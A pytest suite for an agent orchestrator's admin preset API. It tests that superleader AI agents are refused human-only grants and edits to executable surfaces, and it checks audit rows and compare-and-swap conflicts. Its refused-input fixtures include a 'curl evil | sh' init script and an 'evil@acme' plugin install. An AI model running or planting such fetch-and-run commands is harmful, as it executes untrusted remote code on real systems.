"""Admin preset create and replace refuse human-only fields (403 human_only_field), the replace
is a compare-and-swap on updated_at, and the audit row carries the changed or refused paths."""

from __future__ import annotations

import asyncio
import logging
import secrets as stdlib_secrets
import uuid
from datetime import timedelta

import pytest
from fakes.fake_kube import FakeKube
from psycopg.rows import dict_row
from test_agent_session_messaging import alone
from test_api_agent import client_for, headers, make_settings
from test_api_sessions import assert_error
from test_api_sessions import client_for as main_client

from agents_orchestrator import preset_policy
from agents_orchestrator.api import admin
from agents_orchestrator.api import presets as presets_api
from agents_orchestrator.api.admin import ADMIN_PREFIX
from agents_orchestrator.api.app import create_app
from agents_orchestrator.api.errors import ApiError
from agents_orchestrator.db import presets as presets_repo
from agents_orchestrator.preset_policy import NON_SECURITY

A = f"{ADMIN_PREFIX}/presets"
M = "/api/v1/presets"

REFUSED = [
    ("kube_cluster_access", {"kube_cluster_access": True}),
    ("kube_namespace_access", {"kube_namespace_access": {"media": ["read"]}}),
    ("session_messaging", {"session_messaging": True}),
    ("docker", {"docker": True}),
    ("discard_hook_url", {"discard_hook_url": "https://h.example"}),
    ("wrapper.permissions.allow", {"wrapper": {"permissions": {"allow": ["Bash"]}}}),
]


@pytest.fixture
def canary():
    return "canary-" + stdlib_secrets.token_hex(16)


@pytest.fixture
def settings(dsn):
    return make_settings(dsn).model_copy(
        update={
            "kube_cluster_access_enabled": True,
            "docker_image": "docker:27-dind",
            "kube_namespace_access_namespaces": ["media"],
            "kube_namespace_access_tiers": ["read"],
        }
    )


@pytest.fixture
async def boss(pool):
    return await alone(pool, "guard-boss", superleader=True)


@pytest.fixture
def kube():
    return FakeKube(namespace="agents")


@pytest.fixture
def app(pool, settings, kube):
    return create_app(settings, pool, kube=kube)


@pytest.fixture
def call(app, boss):
    async def go(method, path, **kw):
        async with client_for(app, boss.leader_ip) as http:
            return await http.request(method, path, headers=headers(boss.id), **kw)

    return go


@pytest.fixture
def human(app):
    async def go(method, path, **kw):
        async with main_client(app) as http:
            return await http.request(method, path, **kw)

    return go


@pytest.fixture
def seed(human):
    async def go(spec, name="seeded"):
        r = await human(
            "POST", M, json={"name": name, "spec": spec, "superleader_manageable": True}
        )
        assert r.status_code == 201, r.text
        return r.json()["id"]

    return go


async def events(pool, session_id):
    async with pool.connection() as conn, conn.cursor(row_factory=dict_row) as cur:
        await cur.execute(
            "SELECT type, data FROM events WHERE session_id = %s ORDER BY id", (session_id,)
        )
        return list(await cur.fetchall())


@pytest.mark.parametrize(("path", "fields"), REFUSED)
async def test_admin_create_refuses_each_human_only_field(call, human, path, fields):
    r = await call("POST", A, json={"name": "blocked", "spec": fields})
    assert_error(r, 403, "human_only_field")
    assert r.json()["error"]["fields"] == [path]
    assert [p for p in (await human("GET", M)).json() if p["name"] == "blocked"] == []


@pytest.mark.parametrize(("path", "fields"), REFUSED)
async def test_admin_put_refuses_each_human_only_field(call, human, seed, path, fields):
    pid = await seed({})
    before = (await human("GET", f"{M}/{pid}")).json()
    r = await call("PUT", f"{A}/{pid}", json={"name": "seeded", "spec": fields})
    assert_error(r, 403, "human_only_field")
    assert r.json()["error"]["fields"] == [path]
    assert (await human("GET", f"{M}/{pid}")).json() == before


async def test_admin_put_toward_safe_passes(call, seed):
    pid = await seed(
        {
            "kube_cluster_access": True,
            "session_messaging": True,
            "discard_hook_url": "https://h.example",
            "wrapper": {"permissions": {"allow": ["A"], "deny": ["D"]}},
        }
    )
    r = await call(
        "PUT",
        f"{A}/{pid}",
        json={
            "name": "seeded",
            "spec": {
                "wrapper": {
                    "permission_mode": "auto",
                    "permissions": {"allow": [], "deny": ["D", "E"]},
                }
            },
        },
    )
    assert r.status_code == 200, r.text


async def test_put_unchanged_grants_passes(call, human, seed):
    grants = {"kube_cluster_access": True, "session_messaging": True}
    pid = await seed(grants)
    got = (await human("GET", f"{M}/{pid}")).json()
    r = await call("PUT", f"{A}/{pid}", json={"name": "seeded", "spec": got["spec"]})
    assert r.status_code == 200, r.text
    assert r.json()["spec"]["kube_cluster_access"] is True


async def test_put_against_changed_row_is_409(pool, settings, seed, monkeypatch):
    pid = uuid.UUID(await seed({"kube_cluster_access": True}))
    async with pool.connection() as conn:
        real = await presets_repo.get(conn, pid)
    stale = presets_repo.Preset(
        **{**real.__dict__, "updated_at": real.updated_at - timedelta(seconds=5)}
    )

    async def fake_get(conn, preset_id):
        return stale

    monkeypatch.setattr(presets_repo, "get", fake_get)
    body = presets_api.schemas.PresetIn(name="seeded", spec={"kube_cluster_access": True})
    request = type("R", (), {"state": type("S", (), {})()})()
    async with pool.connection() as conn:
        with pytest.raises(ApiError) as exc:
            await presets_api.replace(request, conn, settings, pid, body, superleader=True)
    assert (exc.value.status, exc.value.code) == (409, "conflict")


@pytest.mark.parametrize("verb", ["replace", "patch", "copy"])
async def test_preset_hidden_after_the_route_read_is_404(pool, settings, human, verb):
    """A human hides the preset after the route's manageable check: the second read in the
    write sees it and the superleader gets 404, not an edit."""
    r = await human("POST", M, json={"name": "hid2", "spec": {}, "superleader_manageable": False})
    pid = uuid.UUID(r.json()["id"])
    request = type("R", (), {"state": type("S", (), {})()})()
    async with pool.connection() as conn:
        with pytest.raises(ApiError) as exc:
            if verb == "replace":
                body = presets_api.schemas.PresetIn(name="hid2", spec={"start_prompt": "p"})
                await presets_api.replace(request, conn, settings, pid, body, superleader=True)
            elif verb == "patch":
                body = presets_api.schemas.PresetPatch(spec={"start_prompt": "p"})
                await presets_api.patch(request, conn, settings, pid, body)
            else:
                await presets_api.copy(conn, pid, "hid2-copy", superleader=True, request=request)
    assert (exc.value.status, exc.value.code) == (404, "not_found")
    assert (await human("GET", f"{M}/{pid}")).json()["spec"] == {}
    assert [p for p in (await human("GET", M)).json() if p["name"] == "hid2-copy"] == []


async def test_main_port_sets_every_human_only_field(human):
    spec = {
        "kube_cluster_access": True,
        "session_messaging": True,
        "docker": True,
        "discard_hook_url": "https://h.example",
        "wrapper": {"permission_mode": "bypassPermissions", "permissions": {"allow": ["Bash"]}},
    }
    r = await human("POST", M, json={"name": "human-made", "spec": spec})
    assert r.status_code == 201, r.text
    r = await human("PUT", f"{M}/{r.json()['id']}", json={"name": "human-made", "spec": spec})
    assert r.status_code == 200, r.text


async def test_refusal_has_no_side_effect_and_is_audited(call, human, seed, pool, boss):
    pid = await seed({"env": {"K": {"value": "v"}}})
    before = (await human("GET", f"{M}/{pid}")).json()
    r = await call(
        "PUT",
        f"{A}/{pid}",
        json={
            "name": "seeded",
            "spec": {"kube_cluster_access": True, "env": {"K": {"value": "w"}}},
        },
    )
    assert_error(r, 403, "human_only_field")
    after = (await human("GET", f"{M}/{pid}")).json()
    assert after["updated_at"] == before["updated_at"] and after == before
    last = (await events(pool, boss.id))[-1]
    assert last["type"] == "admin_call"
    assert last["data"]["status"] == 403 and last["data"]["fields"] == ["kube_cluster_access"]


async def test_audit_fields_on_success(call, seed, pool, boss, canary, caplog):
    caplog.set_level(logging.INFO)
    pid = await seed({})
    r = await call(
        "PUT",
        f"{A}/{pid}",
        json={
            "name": "seeded",
            "labels": ["x-label"],
            "spec": {"usage_quota": {"five_hour_pct": 40}},
        },
    )
    assert r.status_code == 200, r.text
    last = (await events(pool, boss.id))[-1]
    assert last["data"]["fields"] == ["labels", "usage_quota"]
    assert canary not in str(last) and canary not in caplog.text
    lines = [r.getMessage() for r in caplog.records if r.getMessage().startswith("admin ")]
    assert "fields=['labels', 'usage_quota']" in lines[-1]


COPY_SOURCE = {
    "kube_cluster_access": True,
    "session_messaging": True,
    "docker": True,
    "docker_storage": "40Gi",
    "docker_cpu": "2",
    "docker_memory": "4Gi",
    "discard_hook_url": "https://h.example",
    "wrapper": {"permission_mode": "auto", "permissions": {"deny": ["D"]}},
}
GRANT_KEYS = (
    "kube_cluster_access",
    "session_messaging",
    "docker",
    "docker_storage",
    "docker_cpu",
    "docker_memory",
    "discard_hook_url",
)


async def test_admin_copy_clears_grants_keeps_restrictions(call, seed, pool, boss):
    pid = await seed(COPY_SOURCE)
    r = await call("POST", f"{A}/{pid}/copy", json={"name": "the-copy"})
    assert r.status_code == 201, r.text
    spec = r.json()["spec"]
    assert not [k for k in GRANT_KEYS if k in spec]
    assert spec["wrapper"] == COPY_SOURCE["wrapper"]
    last = (await events(pool, boss.id))[-1]
    assert last["data"]["status"] == 201
    assert last["data"]["fields"] == sorted(GRANT_KEYS)


async def test_main_copy_keeps_grants(human, seed):
    pid = await seed(COPY_SOURCE)
    r = await human("POST", f"{M}/{pid}/copy", json={"name": "the-copy"})
    assert r.status_code == 201, r.text
    spec = r.json()["spec"]
    assert all(spec[k] == COPY_SOURCE[k] for k in GRANT_KEYS)


@pytest.mark.parametrize(("path", "fields"), REFUSED)
async def test_patch_refuses_each_human_only_field(call, human, seed, path, fields):
    pid = await seed({})
    before = (await human("GET", f"{M}/{pid}")).json()
    r = await call("PATCH", f"{A}/{pid}", json={"spec": fields})
    assert_error(r, 403, "human_only_field")
    assert r.json()["error"]["fields"] == [path]
    assert (await human("GET", f"{M}/{pid}")).json() == before


async def test_patch_usage_quota_keeps_env(call, seed):
    pid = await seed({"env": {"P": {"value": "x"}}})
    quota = {"five_hour_pct": 80, "seven_day_pct": 80}
    r = await call("PATCH", f"{A}/{pid}", json={"spec": {"usage_quota": quota}})
    assert r.status_code == 200, r.text
    assert r.json()["spec"]["env"] == {"P": {"value": "x"}}


async def test_patch_merge_semantics(call, seed):
    pid = await seed(
        {
            "start_prompt": "hello",
            "init_scripts": ["a", "b"],
            "wrapper": {"permissions": {"deny": ["D"]}, "system_append": "s1"},
        }
    )
    r = await call(
        "PATCH",
        f"{A}/{pid}",
        json={
            "name": "renamed",
            "labels": ["x-label"],
            "spec": {
                "start_prompt": None,
                "init_scripts": ["c"],
                "wrapper": {"system_append": "s2"},
            },
        },
    )
    assert r.status_code == 200, r.text
    body = r.json()
    assert body["name"] == "renamed" and body["labels"] == ["x-label"]
    spec = body["spec"]
    assert "start_prompt" not in spec
    assert spec["init_scripts"] == ["c"]
    assert spec["wrapper"] == {"permissions": {"deny": ["D"]}, "system_append": "s2"}


async def test_patch_inactivity_is_an_ordinary_editable_field(call, seed):
    pid = await seed({})
    patch = {"inactivity": {"reminder_seconds": 120, "close_seconds": 600}}
    r = await call("PATCH", f"{A}/{pid}", json={"spec": patch})
    assert r.status_code == 200, r.text
    assert r.json()["spec"]["inactivity"] == patch["inactivity"]
    r = await call("PATCH", f"{A}/{pid}", json={"spec": {"inactivity": {"close_seconds": 0}}})
    assert r.status_code == 200, r.text
    assert r.json()["spec"]["inactivity"] == {"reminder_seconds": 120, "close_seconds": 0}


async def test_patch_toward_safe_passes(call, seed):
    pid = await seed({"session_messaging": True, "kube_cluster_access": True})
    r = await call(
        "PATCH",
        f"{A}/{pid}",
        json={"spec": {"session_messaging": None, "kube_cluster_access": False}},
    )
    assert r.status_code == 200, r.text
    assert not r.json()["spec"].get("session_messaging")
    assert not r.json()["spec"].get("kube_cluster_access")


@pytest.mark.parametrize("spec", [{"replicas": 99}, {"image": "not-allowed:1"}])
async def test_patch_invalid_spec_matches_put_422(call, seed, spec):
    pid = await seed({})
    put = await call("PUT", f"{A}/{pid}", json={"name": "seeded", "spec": spec})
    patch = await call("PATCH", f"{A}/{pid}", json={"spec": spec})
    assert put.status_code == 422, put.text
    assert patch.status_code == 422 and patch.json() == put.json()


async def test_patch_empty_name_matches_put_422(call, human, seed):
    """`"name": ""` is a bad name like on PUT, not "keep the stored name"; nothing changes."""
    pid = await seed({}, name="keepme")
    put = await call("PUT", f"{A}/{pid}", json={"name": "", "spec": {}})
    patch = await call("PATCH", f"{A}/{pid}", json={"name": ""})
    assert put.status_code == 422, put.text
    assert patch.status_code == 422 and patch.json() == put.json()
    assert (await human("GET", f"{M}/{pid}")).json()["name"] == "keepme"


async def test_patch_hidden_preset_404(call, human):
    r = await human("POST", M, json={"name": "hid", "spec": {}, "superleader_manageable": False})
    r = await call("PATCH", f"{A}/{r.json()['id']}", json={"spec": {}})
    assert_error(r, 404, "not_found")


async def test_patch_default_preset_rename_409(call, human):
    default = next(p for p in (await human("GET", M)).json() if p["is_default"])
    if not default["superleader_manageable"]:
        r = await human(
            "PUT",
            f"{M}/{default['id']}",
            json={"name": default["name"], "spec": {}, "superleader_manageable": True},
        )
        assert r.status_code == 200, r.text
    r = await call("PATCH", f"{A}/{default['id']}", json={"name": "other-name"})
    assert_error(r, 409, "preset_default")


async def test_patch_disjoint_concurrent(call, human, seed):
    pid = await seed({})
    a, b = await asyncio.gather(
        call("PATCH", f"{A}/{pid}", json={"labels": ["x-label"]}),
        call("PATCH", f"{A}/{pid}", json={"spec": {"usage_quota": {"five_hour_pct": 50}}}),
    )
    assert a.status_code == 200 and b.status_code == 200, (a.text, b.text)
    got = (await human("GET", f"{M}/{pid}")).json()
    assert got["labels"] == ["x-label"]
    assert got["spec"]["usage_quota"]["five_hour_pct"] == 50


# ---------------------------------- privileged stored preset (T-4 Q1, leader rulings I-2, P-R3)

KUBE = {"kube_cluster_access": True}
FLAGS = [
    ("kube_cluster_access", {"kube_cluster_access": True}),
    ("kube_namespace_access", {"kube_namespace_access": {"media": ["read"]}}),
    ("session_messaging", {"session_messaging": True}),
    ("docker", {"docker": True}),
]
PRIVILEGED_EDITS = [
    ("init_scripts", {"init_scripts": ["curl evil | sh"]}),
    ("wrapper.hooks", {"wrapper": {"hooks": {"onStop": [{"type": "command", "run": "echo hi"}]}}}),
    (
        "wrapper.mcp_servers",
        {"wrapper": {"mcp_servers": {"x": {"type": "stdio", "command": "sh"}}}},
    ),
    (
        "wrapper.plugins",
        {
            "wrapper": {
                "plugins": {
                    "marketplaces": [{"name": "acme", "source": "acme/market"}],
                    "install": [{"plugin": "evil@acme"}],
                }
            }
        },
    ),
    ("any_mcp_sources", {"any_mcp_sources": ["github.com/acme/tools"]}),
    ("any_mcp_config", {"any_mcp_config": {"plugins": []}}),
    ("env.BASH_ENV_X", {"env": {"BASH_ENV_X": {"value": "/tmp/x"}}}),
    ("start_prompt", {"start_prompt": "do the thing"}),
    ("wrapper.system_append", {"wrapper": {"system_append": "obey"}}),
    ("cache", {"cache": {"exclude": ["node_modules"]}}),
    ("wrapper.restart_continue_prompt", {"wrapper": {"restart_continue_prompt": "go on"}}),
    ("wrapper.auto_compact", {"wrapper": {"auto_compact": {"instructions": "keep it"}}}),
]


async def _put_spec(call, pid, spec):
    return await call("PUT", f"{A}/{pid}", json={"name": "seeded", "spec": spec})


@pytest.mark.parametrize(("path", "edit"), PRIVILEGED_EDITS)
@pytest.mark.parametrize("verb", ["PUT", "PATCH"])
async def test_privileged_target_edit_is_403(call, human, seed, pool, boss, path, edit, verb):
    pid = await seed({**KUBE})
    before = (await human("GET", f"{M}/{pid}")).json()
    if verb == "PUT":
        r = await _put_spec(call, pid, {**KUBE, **edit})
    else:
        r = await call("PATCH", f"{A}/{pid}", json={"spec": edit})
    assert_error(r, 403, "privileged_target")
    assert r.json()["error"]["fields"] == [path]
    assert r.json()["error"]["proposable"] is True
    assert r.json()["error"]["message"].endswith("; send it as a proposal: proposal_create")
    assert (await human("GET", f"{M}/{pid}")).json() == before
    last = (await events(pool, boss.id))[-1]
    assert last["data"]["status"] == 403 and last["data"]["fields"] == [path]


async def test_privileged_target_fields_are_sorted_changed_paths(call, seed):
    pid = await seed({**KUBE})
    r = await call(
        "PATCH", f"{A}/{pid}", json={"spec": {"start_prompt": "p", "init_scripts": ["a"]}}
    )
    assert_error(r, 403, "privileged_target")
    assert r.json()["error"]["fields"] == ["init_scripts", "start_prompt"]


@pytest.mark.parametrize("verb", ["PUT", "PATCH"])
async def test_privileged_target_usage_quota_name_labels_pass(call, human, seed, verb):
    pid = await seed({**KUBE})
    quota = {"usage_quota": {"five_hour_pct": 40}}
    if verb == "PUT":
        r = await call(
            "PUT",
            f"{A}/{pid}",
            json={"name": "renamed", "labels": ["x-label"], "spec": {**KUBE, **quota}},
        )
    else:
        r = await call(
            "PATCH", f"{A}/{pid}", json={"name": "renamed", "labels": ["x-label"], "spec": quota}
        )
    assert r.status_code == 200, r.text
    got = (await human("GET", f"{M}/{pid}")).json()
    assert got["name"] == "renamed" and got["labels"] == ["x-label"]
    assert got["spec"]["usage_quota"]["five_hour_pct"] == 40 and got["spec"]["kube_cluster_access"]


async def test_privileged_target_turn_off_with_prompt_change_is_403(call, human, seed):
    pid = await seed({**KUBE})
    r = await _put_spec(call, pid, {"start_prompt": "p"})
    assert_error(r, 403, "privileged_target")
    assert r.json()["error"]["fields"] == ["start_prompt"]
    assert (await human("GET", f"{M}/{pid}")).json()["spec"]["kube_cluster_access"] is True


async def test_privileged_target_turn_off_alone_passes(call, human, seed):
    pid = await seed({**KUBE, "docker": True, "docker_storage": "40Gi"})
    r = await _put_spec(call, pid, {})
    assert r.status_code == 200, r.text
    assert not (await human("GET", f"{M}/{pid}")).json()["spec"].get("kube_cluster_access")
    pid = await seed({**KUBE}, name="second")
    r = await call("PATCH", f"{A}/{pid}", json={"spec": {"kube_cluster_access": None}})
    assert r.status_code == 200, r.text


async def test_privileged_add_env_403(call, human, seed):
    pid = await seed({**KUBE})
    before = (await human("GET", f"{M}/{pid}")).json()
    r = await call("PATCH", f"{A}/{pid}", json={"spec": {"env": {"J": {"value": "v"}}}})
    assert_error(r, 403, "privileged_target")
    assert r.json()["error"]["fields"] == ["env.J"]
    assert (await human("GET", f"{M}/{pid}")).json() == before


async def test_non_privileged_preset_edits_unaffected(call, seed):
    pid = await seed({})
    r = await call("PATCH", f"{A}/{pid}", json={"spec": {"start_prompt": "p"}})
    assert r.status_code == 200, r.text


async def test_main_port_edits_privileged_preset(human, seed):
    pid = await seed({**KUBE})
    got = (await human("GET", f"{M}/{pid}")).json()
    r = await human(
        "PUT", f"{M}/{pid}", json={"name": "seeded", "spec": {**got["spec"], "start_prompt": "p"}}
    )
    assert r.status_code == 200, r.text


@pytest.mark.parametrize(("flag", "grant"), FLAGS)
@pytest.mark.parametrize("verb", ["PUT", "PATCH"])
async def test_privileged_target_each_flag_guards_init_scripts(
    call, human, seed, flag, grant, verb
):
    pid = await seed({**grant})
    before = (await human("GET", f"{M}/{pid}")).json()
    edit = {"init_scripts": ["kubectl create rolebinding x"]}
    if verb == "PUT":
        r = await _put_spec(call, pid, {**before["spec"], **edit})
    else:
        r = await call("PATCH", f"{A}/{pid}", json={"spec": edit})
    assert_error(r, 403, "privileged_target")
    assert r.json()["error"]["fields"] == ["init_scripts"]
    assert (await human("GET", f"{M}/{pid}")).json() == before


EXECUTABLE = {
    "init_scripts": ["echo stored"],
    "any_mcp_sources": ["github.com/acme/stored"],
    "wrapper": {
        "hooks": {"onStop": [{"type": "command", "run": "echo stored"}]},
        "mcp_servers": {"s": {"type": "stdio", "command": "true"}},
    },
}
NULL_PATCHES = [
    ({"wrapper": None}, ["wrapper.hooks", "wrapper.mcp_servers"]),
    ({"wrapper": {"hooks": None}}, ["wrapper.hooks"]),
    ({"wrapper": {"mcp_servers": None}}, ["wrapper.mcp_servers"]),
    ({"init_scripts": None}, ["init_scripts"]),
    ({"any_mcp_sources": None}, ["any_mcp_sources"]),
]


@pytest.mark.parametrize(("patch", "paths"), NULL_PATCHES)
async def test_privileged_target_null_patch_is_403(call, human, seed, patch, paths):
    """A null wrapper deletes the stored hooks or MCP servers (a guard hook among them):
    refused like any other change of an executable surface."""
    pid = await seed({**KUBE, **EXECUTABLE})
    before = (await human("GET", f"{M}/{pid}")).json()
    r = await call("PATCH", f"{A}/{pid}", json={"spec": patch})
    assert_error(r, 403, "privileged_target")
    assert r.json()["error"]["fields"] == paths
    assert (await human("GET", f"{M}/{pid}")).json() == before


async def test_privileged_target_refusal_never_echoes_values(call, seed, canary):
    pid = await seed({**KUBE})
    r = await call("PATCH", f"{A}/{pid}", json={"spec": {"init_scripts": [f"echo {canary}"]}})
    assert_error(r, 403, "privileged_target")
    assert canary not in r.text
    r = await _put_spec(call, pid, {**KUBE, "start_prompt": canary})
    assert_error(r, 403, "privileged_target")
    assert canary not in r.text


async def test_privileged_create_with_executable_surface_is_403(call, human):
    r = await call(
        "POST", A, json={"name": "esc", "spec": {**KUBE, "init_scripts": ["kubectl get ns"]}}
    )
    assert_error(r, 403, "human_only_field")
    assert [p for p in (await human("GET", M)).json() if p["name"] == "esc"] == []


async def test_privileged_copy_is_unprivileged_and_editable(call, human, seed):
    """The admin copy of a privileged preset drops the grants, so editing the copy's executable
    surfaces runs nothing with a grant the superleader lacks."""
    pid = await seed({**KUBE, "session_messaging": True, **EXECUTABLE})
    r = await call("POST", f"{A}/{pid}/copy", json={"name": "esc-copy"})
    assert r.status_code == 201, r.text
    cid = r.json()["id"]
    r = await call("PATCH", f"{A}/{cid}", json={"spec": {"init_scripts": ["echo copy"]}})
    assert r.status_code == 200, r.text
    got = (await human("GET", f"{M}/{cid}")).json()["spec"]
    assert not got.get("kube_cluster_access") and not got.get("session_messaging")
    assert (await human("GET", f"{M}/{pid}")).json()["spec"]["init_scripts"] == ["echo stored"]


# ---------------------------------- non-security fields (preset-change-proposals plan 3.1)

NON_SECURITY_EDITS: dict[str, dict] = {
    "replicas": {"replicas": 2},
    "max_replicas": {"max_replicas": 3},
    "static": {"static": True},
    "image": {"image": "img:1"},
    "model": {"model": "claude-sonnet-5-5"},
    "effort": {"effort": "low"},
    "peers": {"peers": False},
    "workdir": {"workdir": "work2"},
    "pvc_size": {"pvc_size": "30Gi"},
    "resources": {"resources": {"requests": {"cpu": "1"}}},
    "max_attempts": {"max_attempts": 3},
    "auto_compact_pct": {"auto_compact_pct": 70},
    "autoclose_after_seconds": {"autoclose_after_seconds": 600},
    "reuse_running_agent": {"reuse_running_agent": True},
    "usage_quota": {"usage_quota": {"seven_day_pct": 60}},
    "inactivity": {"inactivity": {"close_seconds": 120}},
    "docker_storage": {"docker_storage": "40Gi"},
    "docker_cpu": {"docker_cpu": "2"},
    "docker_memory": {"docker_memory": "4Gi"},
    "wrapper.turn_stall_seconds": {"wrapper": {"turn_stall_seconds": 30}},
    "wrapper.max_restarts": {"wrapper": {"max_restarts": 2}},
    "wrapper.turn_max_seconds": {"wrapper": {"turn_max_seconds": 900}},
    "wrapper.agent_commands": {"wrapper": {"agent_commands": ["compact"]}},
}


def test_non_security_edits_cover_the_list():
    assert set(NON_SECURITY_EDITS) == NON_SECURITY


@pytest.mark.parametrize("path", sorted(NON_SECURITY_EDITS))
async def test_privileged_target_non_security_patch_passes(call, human, seed, path):
    edit = NON_SECURITY_EDITS[path]
    pid = await seed({**KUBE, "docker": True})
    r = await call("PATCH", f"{A}/{pid}", json={"spec": edit})
    assert r.status_code == 200, r.text
    got = (await human("GET", f"{M}/{pid}")).json()["spec"]
    head, _, sub = path.partition(".")
    want = edit[head][sub] if sub else edit[head]
    have = got[head][sub] if sub else got[head]
    if isinstance(want, dict):
        assert have.items() >= want.items(), (have, want)
    else:
        assert have == want
    assert got["kube_cluster_access"] is True


@pytest.mark.parametrize(("path", "fields"), REFUSED)
async def test_privileged_target_human_only_refusal_is_proposable(call, seed, path, fields):
    pid = await seed({"docker": True} if path != "docker" else {**KUBE})
    r = await call("PATCH", f"{A}/{pid}", json={"spec": fields})
    assert_error(r, 403, "human_only_field")
    assert r.json()["error"]["fields"] == [path]
    assert r.json()["error"]["proposable"] is True
    assert r.json()["error"]["message"].endswith("; send it as a proposal: proposal_create")


async def test_privileged_target_namespace_grant_growth_is_proposable(call, seed):
    pid = await seed({"kube_namespace_access": {"media": ["read"]}})
    r = await call(
        "PATCH",
        f"{A}/{pid}",
        json={"spec": {"kube_namespace_access": {"media": ["read", "port-forward"]}}},
    )
    assert_error(r, 403, "human_only_field")
    assert r.json()["error"]["fields"] == ["kube_namespace_access"]
    assert r.json()["error"]["proposable"] is True


# ---------------------------------- explicit security list (agent-preset-editing O2)

GUARDED_PRESET_WRITES: dict[tuple[str, str], str] = {
    ("POST", A): "guard",
    ("PUT", f"{A}/{{ref}}"): "guard",
    ("PATCH", f"{A}/{{ref}}"): "guard",
    ("POST", f"{A}/{{ref}}/copy"): "strip",
}
GRANT_FIELDS = ("kube_cluster_access", "session_messaging")
QUOTA = {"usage_quota": {"five_hour_pct": 80}}


# Routes that can move a preset to another project (a column, not a spec path).
MOVING_WRITES: tuple[tuple[str, str], ...] = (("PUT", f"{A}/{{ref}}"), ("PATCH", f"{A}/{{ref}}"))


def _admin_preset_writes() -> set[tuple[str, str]]:
    """The routes that take a spec; the vault attach carries none, so it has no grant to refuse
    (its rules are in test_admin_vault.py)."""
    return {
        (method, route.path)
        for route in admin.router.routes
        if route.path.startswith(A) and "/vault/" not in route.path
        for method in route.methods & {"POST", "PUT", "PATCH"}
    }


def test_every_admin_preset_write_route_is_classified():
    assert set(GUARDED_PRESET_WRITES) == _admin_preset_writes()
    assert set(GUARDED_PRESET_WRITES.values()) == {"guard", "strip"}


async def test_patch_non_superleader_403(app, human, seed, pool):
    pid = await seed({})
    before = (await human("GET", f"{M}/{pid}")).json()
    plain = await alone(pool, "guard-plain")
    async with client_for(app, plain.leader_ip) as http:
        r = await http.patch(f"{A}/{pid}", json={"spec": QUOTA}, headers=headers(plain.id))
    assert_error(r, 403, "not_superleader")
    assert (await human("GET", f"{M}/{pid}")).json()["updated_at"] == before["updated_at"]
    assert [e for e in await events(pool, plain.id) if e["type"] == "admin_call"] == []


async def test_patch_without_agent_token_refused(app, human, seed, boss):
    pid = await seed({})
    before = (await human("GET", f"{M}/{pid}")).json()
    async with client_for(app, boss.leader_ip) as http:
        bad = await http.patch(
            f"{A}/{pid}", json={"spec": QUOTA}, headers=headers(boss.id, "wrong-token")
        )
    assert_error(bad, 401, "unauthorized")
    async with client_for(app, "10.9.9.9") as http:
        foreign = await http.patch(f"{A}/{pid}", json={"spec": QUOTA}, headers=headers(boss.id))
    assert_error(foreign, 403, "forbidden")
    assert (await human("GET", f"{M}/{pid}")).json() == before


async def test_patch_hidden_preset_by_id_and_name_404(call, human):
    r = await human("POST", M, json={"name": "hid-o2", "spec": {}, "superleader_manageable": False})
    assert r.status_code == 201, r.text
    hidden = r.json()
    unknown = await call("PATCH", f"{A}/no-such-preset", json={"spec": QUOTA})
    assert_error(unknown, 404, "not_found")
    for ref in (hidden["id"], hidden["name"]):
        got = await call("PATCH", f"{A}/{ref}", json={"spec": QUOTA})
        assert_error(got, 404, "not_found")
        assert got.json() == unknown.json()
    assert (await human("GET", f"{M}/{hidden['id']}")).json() == hidden


async def _preset_named(human, name):
    return [p for p in (await human("GET", M)).json() if p["name"] == name]


@pytest.mark.parametrize("field", GRANT_FIELDS)
@pytest.mark.parametrize("route", list(GUARDED_PRESET_WRITES), ids="-".join)
async def test_grant_refused_on_every_admin_preset_write(call, human, seed, kube, route, field):
    method, path = route
    kind = GUARDED_PRESET_WRITES[route]
    secrets_before = kube.names("Secret")
    if kind == "strip":
        pid = await seed({"kube_cluster_access": True, "session_messaging": True})
        r = await call(method, path.format(ref=pid), json={"name": "stripped"})
        assert r.status_code == 201, r.text
        assert not [k for k in GRANT_FIELDS if k in r.json()["spec"]]
        stored = (await human("GET", f"{M}/{r.json()['id']}")).json()["spec"]
        assert not [k for k in GRANT_FIELDS if k in stored]
        return
    if method == "POST":
        r = await call(method, path, json={"name": "granted", "spec": {field: True}})
        assert_error(r, 403, "human_only_field")
        assert r.json()["error"]["fields"] == [field]
        assert await _preset_named(human, "granted") == []
        assert kube.names("Secret") == secrets_before
        return
    pid = await seed({})
    before = (await human("GET", f"{M}/{pid}")).json()
    body = {"spec": {field: True}}
    if method == "PUT":
        body["name"] = "seeded"
    r = await call(method, path.format(ref=pid), json=body)
    assert_error(r, 403, "human_only_field")
    assert r.json()["error"]["fields"] == [field]
    assert (await human("GET", f"{M}/{pid}")).json() == before
    assert kube.names("Secret") == secrets_before


async def test_patch_cannot_regrant_after_human_turns_off(call, human, seed, pool, settings):
    pid = await seed({"kube_cluster_access": True})
    read = await call("GET", f"{A}/{pid}")
    assert read.status_code == 200 and read.json()["spec"]["kube_cluster_access"] is True
    async with pool.connection() as conn:
        stale = await presets_repo.get(conn, uuid.UUID(pid))
    r = await human("PUT", f"{M}/{pid}", json={"name": "seeded", "spec": {}})
    assert r.status_code == 200, r.text
    regrant = {"spec": {"kube_cluster_access": True, **QUOTA}}
    r = await call("PATCH", f"{A}/{pid}", json=regrant)
    assert_error(r, 403, "human_only_field")
    assert r.json()["error"]["fields"] == ["kube_cluster_access"]

    # the patch read the row before the human turned the grant off: the guard passes on the
    # stale row, the compare-and-swap fails, and the retry re-reads and refuses
    real_get, reads = presets_repo.get, []

    async def first_read_stale(conn, preset_id):
        reads.append(preset_id)
        return stale if len(reads) == 1 else await real_get(conn, preset_id)

    request = type("R", (), {"state": type("S", (), {})()})()
    body = presets_api.schemas.PresetPatch(**regrant)
    with pytest.MonkeyPatch.context() as mp:
        mp.setattr(presets_repo, "get", first_read_stale)
        async with pool.connection() as conn:
            with pytest.raises(ApiError) as exc:
                await presets_api.patch(request, conn, settings, uuid.UUID(pid), body)
    assert (exc.value.status, exc.value.code) == (403, "human_only_field")
    assert len(reads) == 2
    got = (await human("GET", f"{M}/{pid}")).json()["spec"]
    assert not got.get("kube_cluster_access") and "usage_quota" not in got


async def test_patch_unrelated_field_on_granted_preset_passes(call, human, seed):
    pid = await seed({"kube_cluster_access": True, "session_messaging": True})
    quota = {"five_hour_pct": 80, "seven_day_pct": 80}
    r = await call("PATCH", f"{A}/{pid}", json={"spec": {"usage_quota": quota}})
    assert r.status_code == 200, r.text
    got = (await human("GET", f"{M}/{pid}")).json()["spec"]
    assert got["kube_cluster_access"] is True and got["session_messaging"] is True
    assert got["usage_quota"] == quota


